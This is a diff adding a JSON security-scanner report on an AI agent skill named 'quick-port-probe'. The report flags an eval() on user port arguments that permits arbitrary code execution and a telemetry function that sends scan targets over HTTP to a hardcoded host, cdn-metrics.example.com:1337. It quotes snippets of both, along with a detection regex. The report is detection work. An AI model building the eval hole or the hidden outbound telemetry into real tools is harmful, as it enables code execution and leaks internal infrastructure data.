@@ -1,0 +1,153 @@
+{
+ "skill_name": "quick-port-probe",
+ "skill_path": "/tmp/cisco_dlr47vcy",
+ "is_safe": false,
+ "max_severity": "CRITICAL",
+ "findings_count": 6,
+ "findings": [
+  {
+   "id": "TOOL_MISMATCH_NETWORK_f9856460c7",
+   "rule_id": "TOOL_ABUSE_UNDECLARED_NETWORK",
+   "category": "unauthorized_tool_use",
+   "severity": "MEDIUM",
+   "title": "Undeclared network usage",
+   "description": "Skill code uses network libraries but doesn't declare network requirement",
+   "file_path": "/tmp/cisco_dlr47vcy/SKILL.md",
+   "line_number": null,
+   "snippet": null,
+   "remediation": "Declare network usage in compatibility field or remove network calls",
+   "analyzer": "static",
+   "metadata": {}
+  },
+  {
+   "id": "llm_finding_quick-port-probe_2",
+   "rule_id": "LLM_SKILL_DISCOVERY_ABUSE",
+   "category": "skill_discovery_abuse",
+   "severity": "MEDIUM",
+   "title": "Capability Inflation: Undisclosed eval() and Telemetry Features",
+   "description": "The skill description claims to be a 'Lightweight TCP port scanner' with no mention of command substitution/eval() capabilities or telemetry data collection. This discrepancy between the stated purpose (simple port scanning) and actual behavior (code execution feature, data reporting) constitutes capability inflation.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": "Description states 'Lightweight TCP port scanner for network diagnostics' but code contains eval() expansion (_preprocess_args) and telemetry transmission (_report) not documented in usage examples.",
+   "remediation": "Update the skill description to fully disclose all features, including the eval() expansion and telemetry behavior.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-4.3",
+    "aitech_name": "Protocol Manipulation",
+    "aisubtech": "AISubtech-4.3.5",
+    "aisubtech_name": "Capability Inflation",
+    "scanner_category": "PROTOCOL MANIPULATION"
+   }
+  },
+  {
+   "id": "llm_finding_quick-port-probe_3",
+   "rule_id": "LLM_OBFUSCATION",
+   "category": "obfuscation",
+   "severity": "LOW",
+   "title": "Obfuscation of Payload in Telemetry Data",
+   "description": "The telemetry function _collect_telemetry packages the scan host and extra user-supplied arguments into a JSON payload that is obfuscated within a structured metrics format, potentially to hide the sensitive nature of the transmitted data.",
+   "file_path": "probe.py",
+   "line_number": 76,
+   "snippet": "The payload key 'extra' can contain the full --ports argument string which may include internal hostnames or infrastructure details, wrapped in a metrics-like structure to appear as benign telemetry.",
+   "remediation": "If telemetry is kept (it should be removed), ensure user data is never included and all data is anonymized and sent over HTTPS.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-9.2",
+    "aitech_name": "Detection Evasion",
+    "aisubtech": "AISubtech-9.2.1",
+    "aisubtech_name": "Obfuscation Vulnerabilities",
+    "scanner_category": "SUSPICIOUS CODE"
+   }
+  },
+  {
+   "id": "llm_finding_quick-port-probe_1",
+   "rule_id": "LLM_DATA_EXFILTRATION",
+   "category": "data_exfiltration",
+   "severity": "HIGH",
+   "title": "Latent Data Exfiltration via Telemetry Endpoint",
+   "description": "The _report function sends scan metadata (including the target host and extra data) to a hardcoded external endpoint (cdn-metrics.example.com:1337) via unencrypted HTTP. Although telemetry is gated behind the --telemetry flag (default off), the skill description does not disclose this data collection behavior. The use of an obscure hostname and HTTP protocol suggests potential for exfiltration of scan information (including sensitive internal infrastructure details).",
+   "file_path": "probe.py",
+   "line_number": 84,
+   "snippet": "req = Request(f'http://{metrics_host}/v1/scan-stats', data=data, headers={'Content-Type': 'application/json'}) where metrics_host = 'cdn-metrics.example.com:1337'. Payload contains host, ports_scanned, and extra data.",
+   "remediation": "Remove the telemetry feature entirely, or clearly disclose it in the skill description and documentation. All communication must be over HTTPS and only with user consent.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-8.2",
+    "aitech_name": "Data Exfiltration / Exposure",
+    "aisubtech": "AISubtech-8.2.3",
+    "aisubtech_name": "Data Exfiltration via Agent Tooling",
+    "scanner_category": "SECURITY VIOLATION"
+   }
+  },
+  {
+   "id": "COMMAND_INJECTION_EVAL_f62243bc2a",
+   "rule_id": "COMMAND_INJECTION_EVAL",
+   "category": "command_injection",
+   "severity": "CRITICAL",
+   "title": "Dangerous code execution functions that can execute arbitrary code",
+   "description": "Pattern detected: eval(",
+   "file_path": "probe.py",
+   "line_number": 120,
+   "snippet": "result = eval(expr, safe_dict, {})",
+   "remediation": "Avoid eval(), exec(), and compile(). Use safer alternatives like ast.literal_eval() or operator module",
+   "analyzer": "static",
+   "metadata": {
+    "matched_pattern": "(?<!['\\\"])\\beval\\s*\\(",
+    "matched_text": "eval(",
+    "aitech": "AITech-9.1",
+    "aitech_name": "Model or Agentic System Manipulation",
+    "scanner_category": "INJECTION ATTACK"
+   }
+  },
+  {
+   "id": "llm_finding_quick-port-probe_0",
+   "rule_id": "LLM_COMMAND_INJECTION",
+   "category": "command_injection",
+   "severity": "CRITICAL",
+   "title": "Arbitrary Code Execution via eval() in Port Argument Processing",
+   "description": "The _preprocess_args function in probe.py uses Python's eval() on user-supplied port arguments. Although the code attempts to restrict builtins to (range, int, len), Python's eval() allows bypassing these restrictions through object introspection (dunder attributes like __class__, __subclasses__), enabling arbitrary code execution. Since the --ports argument is controlled by the user, this creates a direct Remote Code Execution (RCE) vulnerability that can be exploited by an attacker.",
+   "file_path": "probe.py",
+   "line_number": 124,
+   "snippet": "result = eval(expr, safe_dict, {}) where safe_dict = {\"__builtins__\": {\"range\": range, \"int\": int, \"len\": len}} and expr is derived from user input args.ports. Python's eval() with restricted builtins can be bypassed to execute arbitrary system commands (e.g., via os.system) through object subclasses.",
+   "remediation": "Remove the eval() usage entirely. Replace the '$(...)' expansion feature with a robust and safe expression evaluator such as ast.literal_eval() for literal values, or eliminate the feature altogether. Never use eval() on untrusted input, even with restricted builtins.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-9.1",
+    "aitech_name": "Model or Agentic System Manipulation",
+    "aisubtech": "AISubtech-9.1.4",
+    "aisubtech_name": "Injection Attacks (SQL, Command Execution, XSS)",
+    "scanner_category": "INJECTION ATTACK"
+   }
+  }
+ ],
+ "scan_duration_seconds": 23.55714201927185,
+ "duration_ms": 23557,
+ "analyzers_used": [
+  "static_analyzer",
+  "bytecode",
+  "pipeline",
+  "llm_analyzer"
+ ],
+ "timestamp": "2026-08-18T16:10:28.437164+00:00",
+ "scan_metadata": {
+  "policy_name": "default",
+  "policy_version": "1.0",
+  "policy_preset_base": "balanced",
+  "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59",
+  "llm_overall_assessment": "The skill package contains a CRITICAL arbitrary code execution vulnerability via eval() on user-provided arguments, making it unsafe for use in any environment. The presence of latent data exfiltration capability (telemetry endpoint) and undisclosed features further increase the risk. The skill should not be deployed or executed until the eval() vulnerability is eliminated and the telemetry feature is removed or properly disclosed and made opt-in via a clear, user-visible flag.",
+  "llm_primary_threats": [
+   "Arbitrary Code Execution",
+   "Data Exfiltration",
+   "Capability Inflation"
+  ]
+ },
+ "llm_usage": {
+  "input_tokens": 6159,
+  "output_tokens": 1299,
+  "total_tokens": 7458
+ }
+}
